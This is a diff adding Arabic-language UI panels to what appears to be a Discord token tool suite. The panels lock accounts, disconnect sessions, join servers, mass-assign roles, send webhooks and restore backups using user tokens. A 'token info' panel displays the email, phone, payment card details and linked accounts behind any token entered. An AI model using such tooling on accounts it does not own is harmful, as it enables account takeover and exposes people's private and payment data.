+                  <ActionBtn text="🔄 استعادة النسخة" loading={loading} color="green" onClick={async () => { if (!backupToken || !backupGuildId) { setResult('❌ أدخل التوكن + أيدي السيرفر الهدف'); return }; if (!restoreData.trim()) { setResult('❌ الصق ملف JSON أو اختر ملف أولاً'); return }; let parsed; try { parsed = JSON.parse(restoreData) } catch { setResult('❌ ملف JSON غير صالح'); return }; setLoading(true); setProgress('🔄 جاري استعادة النسخة الاحتياطية...'); setResult(''); setStats(null); try { const res = await fetch('/api/server-backup', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: backupToken, guildId: backupGuildId, action: 'restore', backupData: parsed }) }); const ct = res.headers.get('content-type') || ''; if (!ct.includes('text/event-stream')) { const err = await res.json().catch(() => null); if (err?.error) { setResult('❌ ' + err.error); setLoading(false); setProgress(''); return } } const reader = res.body?.getReader(); if (!reader) { setResult('❌ خطأ في الاتصال'); setLoading(false); setProgress(''); return } const decoder = new TextDecoder(); let buffer = ''; while (true) { const { done, value } = await reader.read(); if (done) break; buffer += decoder.decode(value, { stream: true }); const lines = buffer.split('\n'); buffer = lines.pop() || ''; for (const line of lines) { if (!line.startsWith('data: ')) continue; try { const event = JSON.parse(line.substring(6)); if (event.type === 'progress') setProgress(event.message); else if (event.type === 'stats') setStats(event.stats); else if (event.type === 'done') { if (event.success) { setResult(event.message || '✅ تمت الاستعادة بنجاح!'); if (event.stats) setStats(event.stats) } else setResult('❌ ' + (event.error || 'فشل')) } else if (event.type === 'error') setResult('❌ ' + event.message) } catch {} } } } catch { setResult('❌ خطأ في الاتصال') }; setLoading(false); setProgress('') }} />
+                </div>
+              </div></div>
+            )}
+
+            {/* ==================== ACCOUNT LOCKER ==================== */}
+            {section === 'locker' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-red-500/15 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🔒</span><h2 className="text-xl font-black text-red-400">قفل حساب</h2></div>
+                <p className="text-slate-500 text-sm mb-5">حماية الحساب - قفل / فحص الحالة / فتح القفل</p>
+                <TokenInput label="🎫 التوكن" value={lockerToken} onChange={setLockerToken} accent="red" onHelp={() => setShowTokenGuide(true)} />
+                <div className="grid grid-cols-3 gap-2.5 mb-5">
+                  <ActionBtn text="🔒 قفل الحساب" loading={lockerLoading} color="red" onClick={async () => {
+                    if (!lockerToken) { setLockerLogs(['❌ أدخل التوكن']); return }
+                    setLockerLoading(true); setLockerLogs(['⏳ جاري قفل الحساب...'])
+                    try {
+                      const res = await fetch('/api/account-locker', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: lockerToken, action: 'lock' }) })
+                      const data = await res.json()
+                      if (data.success) { setLockerLogs(data.logs || ['✅ تم بنجاح']) } else { setLockerLogs(['❌ ' + (data.error || 'فشل')]) }
+                    } catch { setLockerLogs(['❌ خطأ في الاتصال']) }
+                    setLockerLoading(false)
+                  }} />
+                  <ActionBtn text="🔓 فحص الحالة" loading={lockerLoading} color="yellow" onClick={async () => {
+                    if (!lockerToken) { setLockerLogs(['❌ أدخل التوكن']); return }
+                    setLockerLoading(true); setLockerLogs(['⏳ جاري فحص الحالة...'])
+                    try {
+                      const res = await fetch('/api/account-locker', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: lockerToken, action: 'status' }) })
+                      const data = await res.json()
+                      if (data.success) { setLockerLogs(data.logs || ['✅ تم بنجاح']) } else { setLockerLogs(['❌ ' + (data.error || 'فشل')]) }
+                    } catch { setLockerLogs(['❌ خطأ في الاتصال']) }
+                    setLockerLoading(false)
+                  }} />
+                  <ActionBtn text="📝 فتح القفل" loading={lockerLoading} color="green" onClick={async () => {
+                    if (!lockerToken) { setLockerLogs(['❌ أدخل التوكن']); return }
+                    setLockerLoading(true); setLockerLogs(['⏳ جاري...'])
+                    try {
+                      const res = await fetch('/api/account-locker', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: lockerToken, action: 'unlock' }) })
+                      const data = await res.json()
+                      if (data.success) { setLockerLogs(data.logs || ['✅ تم بنجاح']) } else { setLockerLogs(['❌ ' + (data.error || 'فشل')]) }
+                    } catch { setLockerLogs(['❌ خطأ في الاتصال']) }
+                    setLockerLoading(false)
+                  }} />
+                </div>
+                {lockerLogs.length > 0 && (<div className="bg-black/30 rounded-2xl p-4 border border-red-500/15 animate-fade-in max-h-96 overflow-y-auto">
+                  <h3 className="font-bold text-red-400 text-sm mb-3 text-center">📋 النتائج</h3>
+                  <div className="space-y-1">{lockerLogs.map((log, i) => (<div key={i} className={`text-xs px-3 py-1.5 rounded-lg ${log.startsWith('❌') ? 'text-red-400 bg-red-500/5' : log.startsWith('✅') ? 'text-green-400 bg-green-500/5' : log.startsWith('⚠️') ? 'text-yellow-400 bg-yellow-500/5' : log.startsWith('⏳') ? 'text-cyan-400 bg-cyan-500/5' : 'text-white/60 bg-white/3'} font-mono`}>{log}</div>))}</div>
+                </div>)}
+              </div></div>
+            )}
+
+            {/* ==================== CHANGE AVATAR ==================== */}
+            {section === 'avatar' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-purple-500/15 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🖼️</span><h2 className="text-xl font-black text-purple-400">تغيير الأفتار</h2></div>
+                <p className="text-slate-500 text-sm mb-5">غيّر صورة الحساب عن طريق رابط الصورة</p>
+                <TokenInput label="🎫 التوكن" value={avatarToken} onChange={setAvatarToken} accent="purple" onHelp={() => setShowTokenGuide(true)} />
+                <TextInput label="🖼️ رابط الصورة" value={avatarUrl} onChange={setAvatarUrl} placeholder="https://example.com/avatar.png" accent="purple" />
+                <ActionBtn text="🖼️ تغيير الأفتار" loading={loading} color="purple" onClick={() => { if (!avatarToken || !avatarUrl) { setResult('❌ أدخل التوكن + رابط الصورة'); return }; api('change-avatar', { token: avatarToken, avatarUrl }) }} />
+              </div></div>
+            )}
+
+            {/* ==================== CHANGE BANNER ==================== */}
+            {section === 'banner' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-pink-500/15 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🌈</span><h2 className="text-xl font-black text-pink-400">تغيير البانر</h2></div>
+                <p className="text-slate-500 text-sm mb-5">غيّر بانر الحساب (يحتاج نيترو)</p>
+                <TokenInput label="🎫 التوكن" value={bannerToken} onChange={setBannerToken} accent="pink" onHelp={() => setShowTokenGuide(true)} />
+                <TextInput label="🌈 رابط البانر" value={bannerUrl} onChange={setBannerUrl} placeholder="https://example.com/banner.png" accent="pink" />
+                <ActionBtn text="🌈 تغيير البانر" loading={loading} color="pink" onClick={() => { if (!bannerToken || !bannerUrl) { setResult('❌ أدخل التوكن + رابط البانر'); return }; api('change-banner', { token: bannerToken, bannerUrl }) }} />
+              </div></div>
+            )}
+
+            {/* ==================== HYPESQUAD ==================== */}
+            {section === 'hypesquad' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-purple-500/15 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🎮</span><h2 className="text-xl font-black text-purple-400">هايب سكواد</h2></div>
+                <p className="text-slate-500 text-sm mb-5">غيّر هاوس HypeSquad لحسابك - Bravery, Brilliance, Balance</p>
+                <TokenInput label="🎫 التوكن" value={hypeToken} onChange={setHypeToken} accent="purple" onHelp={() => setShowTokenGuide(true)} />
+                <div className="grid grid-cols-3 gap-3 mb-5">
+                  <button onClick={() => setHypeHouse(1)} className={`rounded-xl p-4 border-2 transition-all cursor-pointer text-center ${hypeHouse === 1 ? 'border-orange-400 bg-orange-500/15 shadow-lg shadow-orange-500/10' : 'border-white/10 bg-white/3 hover:border-orange-500/30 hover:bg-orange-500/5'}`}>
+                    <div className="text-3xl mb-2">⚔️</div>
+                    <div className={`text-sm font-bold ${hypeHouse === 1 ? 'text-orange-400' : 'text-white/50'}`}>Bravery</div>
+                    <div className="text-[9px] text-white/30 mt-1">الشجاعة</div>
+                  </button>
+                  <button onClick={() => setHypeHouse(2)} className={`rounded-xl p-4 border-2 transition-all cursor-pointer text-center ${hypeHouse === 2 ? 'border-blue-400 bg-blue-500/15 shadow-lg shadow-blue-500/10' : 'border-white/10 bg-white/3 hover:border-blue-500/30 hover:bg-blue-500/5'}`}>
+                    <div className="text-3xl mb-2">🧠</div>
+                    <div className={`text-sm font-bold ${hypeHouse === 2 ? 'text-blue-400' : 'text-white/50'}`}>Brilliance</div>
+                    <div className="text-[9px] text-white/30 mt-1">العبقرية</div>
+                  </button>
+                  <button onClick={() => setHypeHouse(3)} className={`rounded-xl p-4 border-2 transition-all cursor-pointer text-center ${hypeHouse === 3 ? 'border-green-400 bg-green-500/15 shadow-lg shadow-green-500/10' : 'border-white/10 bg-white/3 hover:border-green-500/30 hover:bg-green-500/5'}`}>
+                    <div className="text-3xl mb-2">⚖️</div>
+                    <div className={`text-sm font-bold ${hypeHouse === 3 ? 'text-green-400' : 'text-white/50'}`}>Balance</div>
+                    <div className="text-[9px] text-white/30 mt-1">التوازن</div>
+                  </button>
+                </div>
+                <ActionBtn text="🎮 تغيير الهاوس" loading={loading} color="purple" onClick={async () => { if (!hypeToken) { setResult('❌ أدخل التوكن'); return }; setLoading(true); setResult(''); setProgress('🎮 جاري تغيير الهاوس...'); try { const res = await fetch('/api/hypesquad', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: hypeToken, house: hypeHouse }) }); const data = await res.json(); if (data.success) { setResult('✅ ' + (data.message || 'تم التغيير بنجاح!')) } else { setResult('❌ ' + (data.error || 'فشل')) } } catch { setResult('❌ خطأ في الاتصال') }; setLoading(false); setProgress('') }} />
+              </div></div>
+            )}
+
+            {/* ==================== DISCONNECT ==================== */}
+            {section === 'disconnect' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-orange-500/15 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🔌</span><h2 className="text-xl font-black text-orange-400">قطع اتصال التوكن</h2></div>
+                <p className="text-slate-500 text-sm mb-5">تسجيل خروج من كل الأجهزة - قطع جميع جلسات التوكن</p>
+                <TokenInput label="🎫 التوكن" value={disconnectToken} onChange={setDisconnectToken} accent="orange" onHelp={() => setShowTokenGuide(true)} />
+                <div className="bg-red-500/5 rounded-xl p-4 mb-5 border border-red-500/15">
+                  <p className="text-xs text-red-400/80">⚠️ تحذير: بعد قطع الاتصال لن يعمل التوكن مجدداً! تأكد قبل المتابعة</p>
+                </div>
+                <ActionBtn text="🔌 قطع الاتصال" loading={loading} color="red" onClick={async () => {
+                  if (!disconnectToken) { setResult('❌ أدخل التوكن'); return }
+                  setLoading(true); setProgress('🔌 جاري قطع الاتصال...'); setResult('')
+                  try {
+                    const res = await fetch('/api/token-disconnect', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: disconnectToken }) })
+                    const data = await res.json()
+                    if (data.success) setResult(data.message || '✅ تم قطع الاتصال بنجاح!')
+                    else setResult('❌ ' + (data.error || 'فشل'))
+                  } catch { setResult('❌ خطأ في الاتصال') }
+                  setLoading(false); setProgress('')
+                }} />
+              </div></div>
+            )}
+
+            {/* ==================== CREATE SERVER ==================== */}
+            {section === 'create-server' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-slate-700/30 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">➕</span><h2 className="text-xl font-black text-gradient-green">إنشاء سيرفر</h2></div>
+                <p className="text-slate-500 text-sm mb-5">إنشاء سيرفرات ديسكورد جديدة بسرعة</p>
+                <TokenInput label="🎫 التوكن" value={createSrvToken} onChange={setCreateSrvToken} onHelp={() => setShowTokenGuide(true)} />
+                <TextInput label="📝 اسم السيرفر" value={createSrvName} onChange={setCreateSrvName} placeholder="TRJ Server" accent="green" />
+                <TextInput label="🖼️ رابط الأيقونة (اختياري)" value={createSrvIcon} onChange={setCreateSrvIcon} placeholder="https://example.com/icon.png" accent="green" />
+                <ActionBtn text="➕ إنشاء السيرفر" loading={loading} color="green" onClick={async () => { if (!createSrvToken || !createSrvName) { setResult('❌ أدخل التوكن + اسم السيرفر'); return }; setLoading(true); setResult(''); setProgress('➕ جاري إنشاء السيرفر...'); try { const res = await fetch('/api/create-server', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: createSrvToken, name: createSrvName, iconUrl: createSrvIcon || undefined }) }); const data = await res.json(); if (data.success) { const msg = data.message || 'تم إنشاء السيرفر!'; const sid = data.server?.id ? ` | ID: ${data.server.id}` : ''; setResult('✅ ' + msg + sid) } else { setResult('❌ ' + (data.error || 'فشل')) } } catch { setResult('❌ خطأ في الاتصال') }; setLoading(false); setProgress('') }} />
+              </div></div>
+            )}
+
+            {/* ==================== JOIN SERVER ==================== */}
+            {section === 'join-server' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-emerald-500/15 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🏠</span><h2 className="text-xl font-black text-emerald-400">دخول سيرفر</h2></div>
+                <p className="text-slate-500 text-sm mb-5">انضم لأي سيرفر عبر رابط الدعوة - يدعم User و Bot توكن</p>
+                <TokenInput label="🎫 التوكن" value={joinSrvToken} onChange={setJoinSrvToken} accent="green" onHelp={() => setShowTokenGuide(true)} />
+                <div className="mb-5"><label className="text-[11px] text-emerald-300/70 mb-1 block">🔗 رابط الدعوة أو الكود</label><input type="text" value={joinInviteCode} onChange={e => setJoinInviteCode(e.target.value)} placeholder="discord.gg/abc123 أو abc123" className="w-full bg-black/30 border border-emerald-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-emerald-700/30 focus:outline-none focus:border-emerald-400/50 transition-colors" /></div>
+                <ActionBtn text="🏠 انضمام للسيرفر" loading={loading} color="green" onClick={async () => {
+                  if (!joinSrvToken) { setResult('❌ أدخل التوكن'); return }
+                  if (!joinInviteCode.trim()) { setResult('❌ أدخل رابط الدعوة أو الكود'); return }
+                  setLoading(true); setProgress('🏠 جاري الانضمام...'); setResult('')
+                  try {
+                    const res = await fetch('/api/join-server', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: joinSrvToken, inviteCode: joinInviteCode.trim() }) })
+                    const data = await res.json()
+                    if (data.success) {
+                      const guildInfo = data.guild ? ` **${data.guild.name}** (${data.guild.id})` : ''
+                      setResult(data.message || `✅ تم الانضمام بنجاح!${guildInfo}`)
+                    } else setResult('❌ ' + (data.error || 'فشل'))
+                  } catch { setResult('❌ خطأ في الاتصال') }
+                  setLoading(false); setProgress('')
+                }} />
+              </div></div>
+            )}
+
+            {/* ==================== CHANGE BIO ==================== */}
+            {section === 'change-bio' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-cyan-500/15 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">📝</span><h2 className="text-xl font-black text-cyan-400">تغيير البايو</h2></div>
+                <p className="text-slate-500 text-sm mb-5">غيّر البايو (About Me) في بروفايلك - يدعم إيموجي و نص</p>
+                <TokenInput label="🎫 التوكن" value={bioToken} onChange={setBioToken} accent="cyan" onHelp={() => setShowTokenGuide(true)} />
+                <div className="mb-5"><label className="text-[11px] text-cyan-300/70 mb-1 block">📝 البايو الجديد</label><textarea value={bioText} onChange={e => setBioText(e.target.value)} rows={3} maxLength={190} placeholder="اكتب البايو هنا..." className="w-full bg-black/30 border border-cyan-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-cyan-700/30 focus:outline-none focus:border-cyan-400/50 transition-colors resize-none" /><div className="text-right text-[10px] text-cyan-600/50 mt-1">{bioText.length}/190</div></div>
+                <ActionBtn text="📝 تغيير البايو" loading={loading} color="cyan" onClick={async () => { if (!bioToken) { setResult('❌ أدخل التوكن'); return }; if (!bioText.trim()) { setResult('❌ أدخل البايو'); return }; setLoading(true); setResult(''); setProgress('📝 جاري تغيير البايو...'); try { const res = await fetch('/api/change-bio', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: bioToken, bio: bioText.trim() }) }); const data = await res.json(); if (data.success) { setResult('✅ ' + (data.message || 'تم تغيير البايو!')) } else { setResult('❌ ' + (data.error || 'فشل')) } } catch { setResult('❌ خطأ في الاتصال') }; setLoading(false); setProgress('') }} />
+              </div></div>
+            )}
+
+            {/* ==================== TOKEN INFO ==================== */}
+            {section === 'token-info' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-indigo-500/15 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🔍</span><h2 className="text-xl font-black text-indigo-400">معلومات توكن</h2></div>
+                <p className="text-slate-500 text-sm mb-5">عرض كل بيانات الحساب: البروفايل، الإيميل، الدفع، الأصدقاء، السيرفرات، الحسابات المربوطة، النيترو و 2FA - يدعم توكنات المستخدم والبوت</p>
+                <TokenInput label="🎫 التوكن" value={tiToken} onChange={setTiToken} accent="indigo" onHelp={() => setShowTokenGuide(true)} />
+                <ActionBtn text="🔍 عرض المعلومات" loading={loading} color="indigo" onClick={async () => {
+                  if (!tiToken) { setResult('❌ أدخل التوكن'); return }
+                  setLoading(true); setResult(''); setTiResult(null); setProgress('🔍 جاري جلب المعلومات...')
+                  try {
+                    const res = await fetch('/api/token-info', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: tiToken }), signal: AbortSignal.timeout(30000) })
+                    const data = await res.json()
+                    if (data.success) { setTiResult(data); setResult(`✅ تم جلب معلومات الحساب - ${data.token_type === 'bot' ? '🤖 بوت' : '👤 مستخدم'}`) } else { setResult('❌ ' + (data.error || 'فشل')) }
+                  } catch { setResult('❌ خطأ في الاتصال') }
+                  setLoading(false); setProgress('')
+                }} />
+                {tiResult && tiResult.success && (
+                  <div className="mt-5 space-y-3 animate-fade-in">
+                    {/* بطاقة البروفايل */}
+                    <div className="bg-indigo-500/8 rounded-xl p-4 border border-indigo-500/15">
+                      <div className="flex items-center gap-3 mb-3">
+                        {tiResult.avatar && <img src={tiResult.avatar} className="w-14 h-14 rounded-full border-2 border-indigo-500/30" />}
+                        <div className="flex-1">
+                          <div className="text-sm font-bold text-white">{tiResult.username || ''}{tiResult.discriminator && tiResult.discriminator !== '0' ? `#${tiResult.discriminator}` : ''}</div>
+                          {tiResult.global_name && <div className="text-[10px] text-indigo-300/60">الاسم المعروض: {tiResult.global_name}</div>}
+                          <div className="text-[10px] text-indigo-300/60">ID: {tiResult.id || ''} | نوع: {tiResult.token_type === 'bot' ? '🤖 بوت' : '👤 مستخدم'} | انشاء: {tiResult.created_at || 'غير معروف'}</div>
+                        </div>
+                        {tiResult.premium && <span className="text-[10px] bg-indigo-500/20 text-indigo-400 px-2 py-1 rounded-lg border border-indigo-500/20">💎 {tiResult.premium_label || 'نيترو'}</span>}
+                        {tiResult.mfa && <span className="text-[10px] bg-green-500/20 text-green-400 px-2 py-1 rounded-lg border border-green-500/20">🔐 2FA</span>}
+                      </div>
+                      {/* البانر */}
+                      {tiResult.banner && <img src={tiResult.banner} className="w-full h-24 object-cover rounded-lg mb-3 border border-indigo-500/15" />}
+                      <div className="grid grid-cols-2 gap-2">
+                        {tiResult.email && <InfoPill label="البريد" value={tiResult.email} />}
+                        {tiResult.phone && <InfoPill label="الهاتف" value={tiResult.phone} />}
+                        {tiResult.locale && <InfoPill label="اللغة" value={tiResult.locale} />}
+                        <InfoPill label="توثيق البريد" value={tiResult.verified ? 'موثق ✓' : 'غير موثق ✗'} />
+                        <InfoPill label="النيترو" value={tiResult.premium_label || 'بدون'} />
+                        <InfoPill label="2FA" value={tiResult.mfa ? 'مفعّل ✓' : 'غير مفعّل ✗'} />
+                        {tiResult.token_type === 'user' && <InfoPill label="الأصدقاء" value={String(tiResult.friend_count || 0)} />}
+                        {tiResult.token_type === 'user' && <InfoPill label="السيرفرات" value={String(tiResult.guild_count || 0)} />}
+                      </div>
+                    </div>
+                    {/* الفلاقات */}
+                    {tiResult.flags_list && tiResult.flags_list.length > 0 && (
+                      <div className="bg-blue-500/8 rounded-xl p-4 border border-blue-500/15">
+                        <div className="text-xs font-bold text-blue-400 mb-2">🏅 الشارات</div>
+                        <div className="flex flex-wrap gap-1.5">
+                          {tiResult.flags_list.map((f: string, i: number) => (
+                            <span key={i} className="text-[10px] bg-blue-500/15 text-blue-300 px-2 py-1 rounded-lg border border-blue-500/20">{f}</span>
+                          ))}
+                        </div>
+                      </div>
+                    )}
+                    {/* معلومات البوت */}
+                    {tiResult.token_type === 'bot' && (
+                      <div className="bg-purple-500/8 rounded-xl p-4 border border-purple-500/15">
+                        <div className="text-xs font-bold text-purple-400 mb-2">🤖 معلومات البوت</div>
+                        <div className="grid grid-cols-2 gap-2">
+                          <InfoPill label="عام" value={tiResult.bot_public ? 'نعم' : 'لا'} />
+                          <InfoPill label="يتطلب كود" value={tiResult.bot_require_code_grant ? 'نعم' : 'لا'} />
+                        </div>
+                      </div>
+                    )}
+                    {/* معلومات الدفع */}
+                    {tiResult.payments && (
+                      <div className="bg-purple-500/8 rounded-xl p-4 border border-purple-500/15">
+                        <div className="text-xs font-bold text-purple-400 mb-2">💳 معلومات الدفع</div>
+                        <div className="grid grid-cols-2 gap-2">
+                          <InfoPill label="نوع البطاقة" value={tiResult.payments.type || 'لا يوجد'} />
+                          <InfoPill label="آخر 4 أرقام" value={tiResult.payments.last_4 || 'لا يوجد'} />
+                          <InfoPill label="تاريخ الانتهاء" value={tiResult.payments.expires || 'لا يوجد'} />
+                          <InfoPill label="البلد" value={tiResult.payments.country || 'لا يوجد'} />
+                        </div>
+                      </div>
+                    )}
+                    {/* الحسابات المربوطة */}
+                    {tiResult.connections && tiResult.connections.length > 0 && (
+                      <div className="bg-cyan-500/8 rounded-xl p-4 border border-cyan-500/15">
+                        <div className="text-xs font-bold text-cyan-400 mb-2">🔗 الحسابات المربوطة ({tiResult.connections.length})</div>
+                        <div className="space-y-1.5">
+                          {tiResult.connections.map((c: any, i: number) => (
+                            <div key={i} className="flex items-center gap-2 text-[10px]">
+                              <span className="text-white/40">{c.type}:</span>
+                              <span className="text-cyan-300">{c.name || 'مربوط'}</span>
+                              {c.verified && <span className="text-green-400">✓ موثق</span>}
+                              {c.visible && <span className="text-yellow-400">👁 مرئي</span>}
+                            </div>
+                          ))}
+                        </div>
+                      </div>
+                    )}
+                    {/* البايو */}
+                    {tiResult.bio && (
+                      <div className="bg-amber-500/8 rounded-xl p-4 border border-amber-500/15">
+                        <div className="text-xs font-bold text-amber-400 mb-1">📝 البايو</div>
+                        <div className="text-xs text-white/70">{tiResult.bio}</div>
+                      </div>
+                    )}
+                  </div>
+                )}
+              </div></div>
+            )}
+
+            {/* ==================== WEBHOOK SENDER ==================== */}
+            {section === 'webhook-sender' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-sky-500/15 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">📨</span><h2 className="text-xl font-black text-sky-400">إرسال ويب هوك</h2></div>
+                <p className="text-slate-500 text-sm mb-5">إرسال رسائل مخصصة عبر ويب هوك مع اسم وأفتار و إيمبد مخصص - غير السبام العادي</p>
+                <TextInput label="🔗 رابط الويب هوك" value={wsUrl} onChange={setWsUrl} placeholder="https://discord.com/api/webhooks/..." accent="sky" />
+                <div className="grid grid-cols-2 gap-3 mb-4">
+                  <TextInput label="👤 اسم المرسل" value={wsUsername} onChange={setWsUsername} placeholder="اسم مخصص" accent="sky" />
+                  <TextInput label="🖼️ رابط الأفتار" value={wsAvatarUrl} onChange={setWsAvatarUrl} placeholder="https://example.com/avatar.png" accent="sky" />
+                </div>
+                <div className="mb-4"><label className="text-[11px] text-sky-300/70 mb-1 block">💬 الرسالة</label><textarea value={wsMessage} onChange={e => setWsMessage(e.target.value)} rows={3} placeholder="اكتب رسالتك هنا..." className="w-full bg-black/30 border border-sky-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-sky-700/30 focus:outline-none focus:border-sky-400/50 resize-none transition-colors" /></div>
+                <label className="flex items-center gap-2 text-xs text-sky-300 bg-sky-500/8 px-3 py-2 rounded-lg border border-sky-500/15 cursor-pointer mb-3"><input type="checkbox" checked={wsEmbedEnabled} onChange={e => setWsEmbedEnabled(e.target.checked)} className="accent-sky-500" /> تفعيل إيمبد (Embed)</label>
+                {wsEmbedEnabled && (
+                  <div className="mb-4 bg-sky-500/5 rounded-xl p-3 border border-sky-500/15 space-y-3 animate-fade-in">
+                    <TextInput label="📌 عنوان الإيمبد" value={wsEmbedTitle} onChange={setWsEmbedTitle} placeholder="العنوان" accent="sky" />
+                    <div><label className="text-[11px] text-sky-300/70 mb-1 block">📝 وصف الإيمبد</label><textarea value={wsEmbedDesc} onChange={e => setWsEmbedDesc(e.target.value)} rows={3} placeholder="الوصف..." className="w-full bg-black/30 border border-sky-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-sky-700/30 focus:outline-none focus:border-sky-400/50 resize-none transition-colors" /></div>
+                    <div className="flex gap-3"><TextInput label="🎨 لون (Hex)" value={wsEmbedColor} onChange={setWsEmbedColor} placeholder="5865F2" accent="sky" /><div className="w-10 h-10 rounded-xl border border-sky-500/30 mt-5" style={{ backgroundColor: '#' + wsEmbedColor }} /></div>
+                  </div>
+                )}
+                <ActionBtn text="📨 إرسال الرسالة" loading={loading} color="sky" onClick={async () => {
+                  if (!wsUrl) { setResult('❌ أدخل رابط الويب هوك'); return }
+                  setLoading(true); setResult(''); setProgress('📨 جاري الإرسال...')
+                  try {
+                    const payload: any = { url: wsUrl, message: wsMessage, username: wsUsername, avatar_url: wsAvatarUrl }
+                    if (wsEmbedEnabled) { payload.embed = { title: wsEmbedTitle, description: wsEmbedDesc, color: parseInt(wsEmbedColor, 16) || 0x5865F2 } }
+                    const res = await fetch('/api/webhook-sender', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) })
+                    const data = await res.json()
+                    if (data.success) { setResult('✅ تم إرسال الرسالة بنجاح') } else { setResult('❌ ' + (data.error || 'فشل الإرسال')) }
+                  } catch { setResult('❌ خطأ في الاتصال') }
+                  setLoading(false); setProgress('')
+                }} />
+              </div></div>
+            )}
+
+            {/* ==================== ROLES MANAGER ==================== */}
+            {section === 'roles-manager' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-rose-500/15 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🛡️</span><h2 className="text-xl font-black text-rose-400">إدارة رتب</h2></div>
+                <p className="text-slate-500 text-sm mb-5">إعطاء أو سحب رتبة من جميع أعضاء السيرفر - أو حذف وإنشاء رتب</p>
+                <TokenInput label="🎫 التوكن" value={rmToken} onChange={setRmToken} accent="rose" onHelp={() => setShowTokenGuide(true)} />
+                <TextInput label="🏰 أيدي السيرفر" value={rmGuildId} onChange={setRmGuildId} placeholder="Server ID" accent="rose" />
+                <TextInput label="🛡️ أيدي الرتبة" value={rmRoleId} onChange={setRmRoleId} placeholder="Role ID" accent="rose" />
+                <div className="grid grid-cols-3 gap-2 mb-4">
+                  <ActionBtn text="➕ إعطاء الكل" loading={loading} color="green" onClick={async () => { if (!rmToken || !rmGuildId || !rmRoleId) { setResult('❌ أدخل التوكن + السيرفر + الرتبة'); return }; setLoading(true); setResult(''); setProgress('➕ جاري إعطاء الرتبة للجميع...'); try { const res = await fetch('/api/roles-manager', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: rmToken, guildId: rmGuildId, roleId: rmRoleId, action: 'give_all' }), signal: AbortSignal.timeout(180000) }); const data = await res.json(); if (data.success) { setResult(`✅ تم إعطاء الرتبة - نجح: ${data.succeeded || 0} | فشل: ${data.failed || 0} | المجموع: ${data.total || 0}`); if (data.total) setStats({ roles: data.succeeded }) } else { setResult('❌ ' + (data.error || 'فشل')) } } catch { setResult('❌ خطأ في الاتصال') }; setLoading(false); setProgress('') }} />
+                  <ActionBtn text="➖ سحب من الكل" loading={loading} color="red" onClick={async () => { if (!rmToken || !rmGuildId || !rmRoleId) { setResult('❌ أدخل التوكن + السيرفر + الرتبة'); return }; setLoading(true); setResult(''); setProgress('➖ جاري سحب الرتبة من الجميع...'); try { const res = await fetch('/api/roles-manager', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: rmToken, guildId: rmGuildId, roleId: rmRoleId, action: 'remove_all' }), signal: AbortSignal.timeout(180000) }); const data = await res.json(); if (data.success) { setResult(`✅ تم سحب الرتبة - نجح: ${data.succeeded || 0} | فشل: ${data.failed || 0} | المجموع: ${data.total || 0}`) } else { setResult('❌ ' + (data.error || 'فشل')) } } catch { setResult('❌ خطأ في الاتصال') }; setLoading(false); setProgress('') }} />
